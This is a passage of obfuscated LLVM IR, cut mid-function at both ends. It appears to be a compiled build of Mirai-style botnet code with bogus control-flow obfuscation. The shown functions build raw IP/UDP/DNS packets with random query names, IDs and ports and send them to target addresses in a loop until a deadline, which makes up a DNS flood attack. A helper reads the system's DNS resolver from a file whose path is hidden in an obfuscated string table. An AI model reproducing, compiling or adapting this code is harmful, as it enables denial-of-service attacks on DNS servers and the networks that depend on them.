originalBB37:                                     ; preds = %originalBB37alteredBB, %380
  %389 = load i32, i32* @x.33
  %390 = load i32, i32* @y.34
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %397

; <label>:397:                                    ; preds = %originalBBpart268, %originalBBpart239
  store i32 0, i32* %19, align 4
  br label %398

; <label>:398:                                    ; preds = %564, %397
  %399 = load i32, i32* @x.33
  %400 = load i32, i32* @y.34
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %398
  %407 = load i32, i32* %19, align 4
  %408 = load i8, i8* %15, align 1
  %409 = zext i8 %408 to i32
  %410 = icmp slt i32 %407, %409
  %411 = load i32, i32* @x.33
  %412 = load i32, i32* @y.34
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %410, label %419, label %567

; <label>:419:                                    ; preds = %originalBBpart243
  %420 = load i8**, i8*** %21, align 8
  %421 = load i32, i32* %19, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds i8*, i8** %420, i64 %422
  %424 = load i8*, i8** %423, align 8
  store i8* %424, i8** %43, align 8
  %425 = load i8*, i8** %43, align 8
  %426 = bitcast i8* %425 to %struct.iphdr*
  store %struct.iphdr* %426, %struct.iphdr** %44, align 8
  %427 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i64 1
  %429 = bitcast %struct.iphdr* %428 to %struct.udphdr*
  store %struct.udphdr* %429, %struct.udphdr** %45, align 8
  %430 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %431 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %430, i64 1
  %432 = bitcast %struct.udphdr* %431 to %struct.dnshdr*
  store %struct.dnshdr* %432, %struct.dnshdr** %46, align 8
  %433 = load %struct.dnshdr*, %struct.dnshdr** %46, align 8
  %434 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %433, i64 1
  %435 = bitcast %struct.dnshdr* %434 to i8*
  %436 = getelementptr inbounds i8, i8* %435, i64 1
  store i8* %436, i8** %47, align 8
  %437 = load i16, i16* %23, align 2
  %438 = zext i16 %437 to i32
  %439 = icmp eq i32 %438, 65535
  br i1 %439, label %440, label %462

; <label>:440:                                    ; preds = %419
  %441 = load i32, i32* @x.33
  %442 = load i32, i32* @y.34
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %440
  %449 = call i32 @rand_next()
  %450 = and i32 %449, 65535
  %451 = trunc i32 %450 to i16
  %452 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 3
  store i16 %451, i16* %453, align 4
  %454 = load i32, i32* @x.33
  %455 = load i32, i32* @y.34
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBBpart260, label %originalBB45alteredBB

originalBBpart260:                                ; preds = %originalBB45
  br label %462

; <label>:462:                                    ; preds = %originalBBpart260, %419
  %463 = load i16, i16* %26, align 2
  %464 = zext i16 %463 to i32
  %465 = icmp eq i32 %464, 65535
  br i1 %465, label %466, label %472

; <label>:466:                                    ; preds = %462
  %467 = call i32 @rand_next()
  %468 = and i32 %467, 65535
  %469 = trunc i32 %468 to i16
  %470 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %471 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %470, i32 0, i32 0
  store i16 %469, i16* %471, align 2
  br label %472

; <label>:472:                                    ; preds = %466, %462
  %473 = load i16, i16* %27, align 2
  %474 = zext i16 %473 to i32
  %475 = icmp eq i32 %474, 65535
  br i1 %475, label %476, label %482

; <label>:476:                                    ; preds = %472
  %477 = call i32 @rand_next()
  %478 = and i32 %477, 65535
  %479 = trunc i32 %478 to i16
  %480 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %481 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %480, i32 0, i32 1
  store i16 %479, i16* %481, align 2
  br label %482

; <label>:482:                                    ; preds = %476, %472
  %483 = load i16, i16* %28, align 2
  %484 = zext i16 %483 to i32
  %485 = icmp eq i32 %484, 65535
  br i1 %485, label %486, label %492

; <label>:486:                                    ; preds = %482
  %487 = call i32 @rand_next()
  %488 = and i32 %487, 65535
  %489 = trunc i32 %488 to i16
  %490 = load %struct.dnshdr*, %struct.dnshdr** %46, align 8
  %491 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %490, i32 0, i32 0
  store i16 %489, i16* %491, align 2
  br label %492

; <label>:492:                                    ; preds = %486, %482
  %493 = load i8*, i8** %47, align 8
  %494 = load i8, i8* %29, align 1
  %495 = zext i8 %494 to i32
  call void @rand_alphastr(i8* %493, i32 %495)
  %496 = load i8*, i8** %47, align 8
  %497 = load i8, i8* %29, align 1
  %498 = zext i8 %497 to i64
  %499 = getelementptr inbounds i8, i8* %496, i64 %498
  store i8 0, i8* %499, align 1
  %500 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i32 0, i32 7
  store i16 0, i16* %501, align 2
  %502 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %503 = bitcast %struct.iphdr* %502 to i16*
  %504 = call zeroext i16 @checksum_generic(i16* %503, i32 20)
  %505 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %506 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %505, i32 0, i32 7
  store i16 %504, i16* %506, align 2
  %507 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %508 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %507, i32 0, i32 3
  store i16 0, i16* %508, align 2
  %509 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %510 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %511 = bitcast %struct.udphdr* %510 to i8*
  %512 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %513 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %512, i32 0, i32 2
  %514 = load i16, i16* %513, align 2
  %515 = load i8, i8* %29, align 1
  %516 = zext i8 %515 to i64
  %517 = add i64 21, %516
  %518 = add i64 %517, 2
  %519 = load i32, i32* %31, align 4
  %520 = sext i32 %519 to i64
  %521 = add i64 %518, %520
  %522 = add i64 %521, 4
  %523 = trunc i64 %522 to i32
  %524 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %509, i8* %511, i16 zeroext %514, i32 %523)
  %525 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %526 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %525, i32 0, i32 3
  store i16 %524, i16* %526, align 2
  %527 = load i32, i32* %32, align 4
  %528 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %529 = load i32, i32* %19, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %528, i64 %530
  %532 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %531, i32 0, i32 0
  %533 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %532, i32 0, i32 2
  %534 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %533, i32 0, i32 0
  store i32 %527, i32* %534, align 4
  %535 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %536 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %535, i32 0, i32 1
  %537 = load i16, i16* %536, align 2
  %538 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %539 = load i32, i32* %19, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %538, i64 %540
  %542 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %541, i32 0, i32 0
  %543 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %542, i32 0, i32 1
  store i16 %537, i16* %543, align 2
  %544 = load i32, i32* %20, align 4
  %545 = load i8*, i8** %43, align 8
  %546 = load i8, i8* %29, align 1
  %547 = zext i8 %546 to i64
  %548 = add i64 41, %547
  %549 = add i64 %548, 2
  %550 = load i32, i32* %31, align 4
  %551 = sext i32 %550 to i64
  %552 = add i64 %549, %551
  %553 = add i64 %552, 4
  %554 = bitcast %union.__CONST_SOCKADDR_ARG* %48 to %struct.sockaddr**
  %555 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %556 = load i32, i32* %19, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i64 %557
  %559 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %558, i32 0, i32 0
  %560 = bitcast %struct.sockaddr_in* %559 to %struct.sockaddr*
  store %struct.sockaddr* %560, %struct.sockaddr** %554, align 8
  %561 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %48, i32 0, i32 0
  %562 = load %struct.sockaddr*, %struct.sockaddr** %561, align 8
  %563 = call i64 @sendto(i32 %544, i8* %545, i64 %553, i32 16384, %struct.sockaddr* %562, i32 16)
  br label %564

; <label>:564:                                    ; preds = %492
  %565 = load i32, i32* %19, align 4
  %566 = add nsw i32 %565, 1
  store i32 %566, i32* %19, align 4
  br label %398

; <label>:567:                                    ; preds = %originalBBpart243
  %568 = load i32, i32* @x.33
  %569 = load i32, i32* @y.34
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %567
  %576 = call i64 @time(i64* null) #6
  %577 = load i32, i32* %33, align 4
  %578 = sext i32 %577 to i64
  %579 = icmp sgt i64 %576, %578
  %580 = load i32, i32* @x.33
  %581 = load i32, i32* @y.34
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %579, label %588, label %589

; <label>:588:                                    ; preds = %originalBBpart264
  br label %606

; <label>:589:                                    ; preds = %originalBBpart264
  %590 = load i32, i32* @x.33
  %591 = load i32, i32* @y.34
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %589
  %598 = load i32, i32* @x.33
  %599 = load i32, i32* @y.34
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %397

; <label>:606:                                    ; preds = %588, %148, %126, %originalBBpart27
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %607 = alloca i32, align 4
  %608 = alloca i8, align 1
  %609 = alloca %struct.attack_target*, align 8
  %610 = alloca i8, align 1
  %611 = alloca %struct.attack_option*, align 8
  %612 = alloca i32, align 4
  %613 = alloca i32, align 4
  %614 = alloca i8**, align 8
  %615 = alloca i8, align 1
  %616 = alloca i16, align 2
  %617 = alloca i8, align 1
  %618 = alloca i8, align 1
  %619 = alloca i16, align 2
  %620 = alloca i16, align 2
  %621 = alloca i16, align 2
  %622 = alloca i8, align 1
  %623 = alloca i8*, align 8
  %624 = alloca i32, align 4
  %625 = alloca i32, align 4
  %626 = alloca i32, align 4
  %627 = alloca i32, align 4
  %628 = alloca i8, align 1
  %629 = alloca i8, align 1
  %630 = alloca %struct.iphdr*, align 8
  %631 = alloca %struct.udphdr*, align 8
  %632 = alloca %struct.dnshdr*, align 8
  %633 = alloca i8*, align 8
  %634 = alloca i8*, align 8
  %635 = alloca %struct.grehdr*, align 8
  %636 = alloca i8*, align 8
  %637 = alloca %struct.iphdr*, align 8
  %638 = alloca %struct.udphdr*, align 8
  %639 = alloca %struct.dnshdr*, align 8
  %640 = alloca i8*, align 8
  %641 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %607, align 4
  store i8 %1, i8* %608, align 1
  store %struct.attack_target* %2, %struct.attack_target** %609, align 8
  store i8 %3, i8* %610, align 1
  store %struct.attack_option* %4, %struct.attack_option** %611, align 8
  store i32 0, i32* %612, align 4
  store i32 0, i32* %613, align 4
  %642 = load i8, i8* %608, align 1
  %643 = zext i8 %642 to i64
  %644 = call noalias i8* @calloc(i64 %643, i64 8) #6
  %645 = bitcast i8* %644 to i8**
  store i8** %645, i8*** %614, align 8
  %646 = load i8, i8* %610, align 1
  %647 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %648 = call i32 @attack_get_opt_int(i8 zeroext %646, %struct.attack_option* %647, i8 zeroext 2, i32 0)
  %649 = trunc i32 %648 to i8
  store i8 %649, i8* %615, align 1
  %650 = load i8, i8* %610, align 1
  %651 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %652 = call i32 @attack_get_opt_int(i8 zeroext %650, %struct.attack_option* %651, i8 zeroext 3, i32 65535)
  %653 = trunc i32 %652 to i16
  store i16 %653, i16* %616, align 2
  %654 = load i8, i8* %610, align 1
  %655 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %656 = call i32 @attack_get_opt_int(i8 zeroext %654, %struct.attack_option* %655, i8 zeroext 4, i32 64)
  %657 = trunc i32 %656 to i8
  store i8 %657, i8* %617, align 1
  %658 = load i8, i8* %610, align 1
  %659 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %660 = call i32 @attack_get_opt_int(i8 zeroext %658, %struct.attack_option* %659, i8 zeroext 5, i32 0)
  %661 = trunc i32 %660 to i8
  store i8 %661, i8* %618, align 1
  %662 = load i8, i8* %610, align 1
  %663 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %664 = call i32 @attack_get_opt_int(i8 zeroext %662, %struct.attack_option* %663, i8 zeroext 6, i32 65535)
  %665 = trunc i32 %664 to i16
  store i16 %665, i16* %619, align 2
  %666 = load i8, i8* %610, align 1
  %667 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %668 = call i32 @attack_get_opt_int(i8 zeroext %666, %struct.attack_option* %667, i8 zeroext 7, i32 53)
  %669 = trunc i32 %668 to i16
  store i16 %669, i16* %620, align 2
  %670 = load i8, i8* %610, align 1
  %671 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %672 = call i32 @attack_get_opt_int(i8 zeroext %670, %struct.attack_option* %671, i8 zeroext 9, i32 65535)
  %673 = trunc i32 %672 to i16
  store i16 %673, i16* %621, align 2
  %674 = load i8, i8* %610, align 1
  %675 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %676 = call i32 @attack_get_opt_int(i8 zeroext %674, %struct.attack_option* %675, i8 zeroext 0, i32 12)
  %677 = trunc i32 %676 to i8
  store i8 %677, i8* %622, align 1
  %678 = load i8, i8* %610, align 1
  %679 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %680 = call i8* @attack_get_opt_str(i8 zeroext %678, %struct.attack_option* %679, i8 zeroext 8, i8* null)
  store i8* %680, i8** %623, align 8
  store i32 0, i32* %624, align 4
  %681 = call i32 @get_dns_resolver()
  store i32 %681, i32* %625, align 4
  %682 = call i64 @time(i64* null) #6
  %683 = load i32, i32* %607, align 4
  %684 = sext i32 %683 to i64
  %_ = sub i64 %682, %684
  %gen = mul i64 %_, %684
  %_1 = sub i64 0, %682
  %gen2 = add i64 %_1, %684
  %_3 = shl i64 %682, %684
  %_4 = shl i64 %682, %684
  %685 = add nsw i64 %682, %684
  %686 = trunc i64 %685 to i32
  store i32 %686, i32* %626, align 4
  %687 = load i8*, i8** %623, align 8
  %688 = icmp eq i8* %687, null
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %104
  br label %originalBB5

originalBB9alteredBB:                             ; preds = %originalBB9, %127
  store i32 1, i32* %19, align 4
  %689 = load i32, i32* %20, align 4
  %690 = bitcast i32* %19 to i8*
  %691 = call i32 @setsockopt(i32 %689, i32 0, i32 3, i8* %690, i32 4) #6
  %692 = icmp eq i32 %691, -1
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %152
  %693 = load i32, i32* %19, align 4
  %694 = load i8, i8* %15, align 1
  %695 = zext i8 %694 to i32
  %696 = icmp slt i32 %693, %695
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %289
  %697 = load i8*, i8** %30, align 8
  %698 = load i32, i32* %34, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds i8, i8* %697, i64 %699
  %701 = load i8, i8* %700, align 1
  %702 = sext i8 %701 to i32
  %703 = icmp eq i32 %702, 46
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %327
  %704 = load i32, i32* %34, align 4
  %_22 = sub i32 %704, 1
  %gen23 = mul i32 %_22, 1
  %_24 = shl i32 %704, 1
  %_25 = shl i32 %704, 1
  %_26 = sub i32 0, %704
  %gen27 = add i32 %_26, 1
  %_28 = sub i32 0, %704
  %gen29 = add i32 %_28, 1
  %705 = add nsw i32 %704, 1
  store i32 %705, i32* %34, align 4
  br label %originalBB21

originalBB33alteredBB:                            ; preds = %originalBB33, %346
  %706 = load i8, i8* %35, align 1
  %707 = load i8*, i8** %41, align 8
  store i8 %706, i8* %707, align 1
  %708 = load i8*, i8** %40, align 8
  %709 = load i32, i32* %31, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds i8, i8* %708, i64 %710
  %712 = getelementptr inbounds i8, i8* %711, i64 2
  %713 = bitcast i8* %712 to %struct.grehdr*
  store %struct.grehdr* %713, %struct.grehdr** %42, align 8
  %714 = call zeroext i16 @htons(i16 zeroext 1) #7
  %715 = load %struct.grehdr*, %struct.grehdr** %42, align 8
  %716 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %715, i32 0, i32 0
  store i16 %714, i16* %716, align 2
  %717 = call zeroext i16 @htons(i16 zeroext 1) #7
  %718 = load %struct.grehdr*, %struct.grehdr** %42, align 8
  %719 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %718, i32 0, i32 1
  store i16 %717, i16* %719, align 2
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %380
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %398
  %720 = load i32, i32* %19, align 4
  %721 = load i8, i8* %15, align 1
  %722 = zext i8 %721 to i32
  %723 = icmp slt i32 %720, %722
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %440
  %724 = call i32 @rand_next()
  %_46 = sub i32 0, %724
  %gen47 = add i32 %_46, 65535
  %_48 = sub i32 0, %724
  %gen49 = add i32 %_48, 65535
  %_50 = sub i32 %724, 65535
  %gen51 = mul i32 %_50, 65535
  %_52 = sub i32 %724, 65535
  %gen53 = mul i32 %_52, 65535
  %_54 = sub i32 %724, 65535
  %gen55 = mul i32 %_54, 65535
  %_56 = sub i32 0, %724
  %gen57 = add i32 %_56, 65535
  %_58 = shl i32 %724, 65535
  %725 = and i32 %724, 65535
  %726 = trunc i32 %725 to i16
  %727 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %728 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %727, i32 0, i32 3
  store i16 %726, i16* %728, align 4
  br label %originalBB45

originalBB62alteredBB:                            ; preds = %originalBB62, %567
  %729 = call i64 @time(i64* null) #6
  %730 = load i32, i32* %33, align 4
  %731 = sext i32 %730 to i64
  %732 = icmp sgt i64 %729, %731
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %589
  br label %originalBB66
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = load i32, i32* @x.35
  %2 = load i32, i32* @y.36
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [2048 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [32 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  store i32 0, i32* %10, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %19 = call i8* @table_retrieve_val(i32 37, i32* null)
  %20 = call i32 (i8*, i32, ...) @open(i8* %19, i32 0)
  store i32 %20, i32* %10, align 4
  call void @table_lock_val(i8 zeroext 37)
  %21 = load i32, i32* %10, align 4
  %22 = icmp sge i32 %21, 0
  %23 = load i32, i32* @x.35
  %24 = load i32, i32* @y.36
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %191

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %32 = load i32, i32* %10, align 4
  %33 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %34 = call i64 @read(i32 %32, i8* %33, i64 2048)
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %11, align 4
  %36 = load i32, i32* %10, align 4
  %37 = call i32 @close(i32 %36)
  call void @table_unlock_val(i8 zeroext 38)
  %38 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %39 = load i32, i32* %11, align 4
  %40 = call i8* @table_retrieve_val(i32 38, i32* null)
  %41 = call i32 @util_stristr(i8* %38, i32 %39, i8* %40)
  store i32 %41, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 38)
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, -1
  br i1 %43, label %44, label %190

; <label>:44:                                     ; preds = %31
  store i32 0, i32* %14, align 4
  store i8 0, i8* %16, align 1
  store i8 0, i8* %17, align 1
  %45 = load i32, i32* %12, align 4
  store i32 %45, i32* %14, align 4
  br label %46

; <label>:46:                                     ; preds = %originalBBpart234, %44
  %47 = load i32, i32* @x.35
  %48 = load i32, i32* @y.36
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i32, i32* %14, align 4
  %56 = load i32, i32* %11, align 4
  %57 = icmp slt i32 %55, %56
  %58 = load i32, i32* @x.35
  %59 = load i32, i32* @y.36
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %66, label %183

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = load i32, i32* %14, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 %68
  %70 = load i8, i8* %69, align 1
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %16, align 1
  %72 = icmp ne i8 %71, 0
  br i1 %72, label %100, label %73

; <label>:73:                                     ; preds = %66
  %74 = load i32, i32* @x.35
  %75 = load i32, i32* @y.36
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i8, i8* %18, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp eq i32 %83, 32
  %85 = load i32, i32* @x.35
  %86 = load i32, i32* @y.36
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %84, label %97, label %93

; <label>:93:                                     ; preds = %originalBBpart28
  %94 = load i8, i8* %18, align 1
  %95 = sext i8 %94 to i32
  %96 = icmp eq i32 %95, 9
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %93, %originalBBpart28
  br label %164

; <label>:98:                                     ; preds = %93
  store i8 1, i8* %16, align 1
  br label %99

; <label>:99:                                     ; preds = %98
  br label %100

; <label>:100:                                    ; preds = %99, %66
  %101 = load i8, i8* %18, align 1
  %102 = sext i8 %101 to i32
  %103 = icmp ne i32 %102, 46
  br i1 %103, label %104, label %128

; <label>:104:                                    ; preds = %100
  %105 = load i32, i32* @x.35
  %106 = load i32, i32* @y.36
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %104
  %113 = load i8, i8* %18, align 1
  %114 = sext i8 %113 to i32
  %115 = icmp slt i32 %114, 48
  %116 = load i32, i32* @x.35
  %117 = load i32, i32* @y.36
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %115, label %133, label %124

; <label>:124:                                    ; preds = %originalBBpart212
  %125 = load i8, i8* %18, align 1
  %126 = sext i8 %125 to i32
  %127 = icmp sgt i32 %126, 57
  br i1 %127, label %133, label %128

; <label>:128:                                    ; preds = %124, %100
  %129 = load i32, i32* %14, align 4
  %130 = load i32, i32* %11, align 4
  %131 = sub nsw i32 %130, 1
  %132 = icmp eq i32 %129, %131
  br i1 %132, label %133, label %163

; <label>:133:                                    ; preds = %128, %124, %originalBBpart212
  %134 = load i32, i32* @x.35
  %135 = load i32, i32* @y.36
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %133
  %142 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %143 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %144 = load i32, i32* %12, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8, i8* %143, i64 %145
  %147 = load i32, i32* %14, align 4
  %148 = load i32, i32* %12, align 4
  %149 = sub nsw i32 %147, %148
  call void @util_memcpy(i8* %142, i8* %146, i32 %149)
  %150 = load i32, i32* %14, align 4
  %151 = load i32, i32* %12, align 4
  %152 = sub nsw i32 %150, %151
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i64 0, i64 %153
  store i8 0, i8* %154, align 1
  store i8 1, i8* %17, align 1
  %155 = load i32, i32* @x.35
  %156 = load i32, i32* @y.36
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart227, label %originalBB14alteredBB

originalBBpart227:                                ; preds = %originalBB14
  br label %183

; <label>:163:                                    ; preds = %128
  br label %164

; <label>:164:                                    ; preds = %163, %97
  %165 = load i32, i32* @x.35
  %166 = load i32, i32* @y.36
  %167 = sub i32 %165, 1
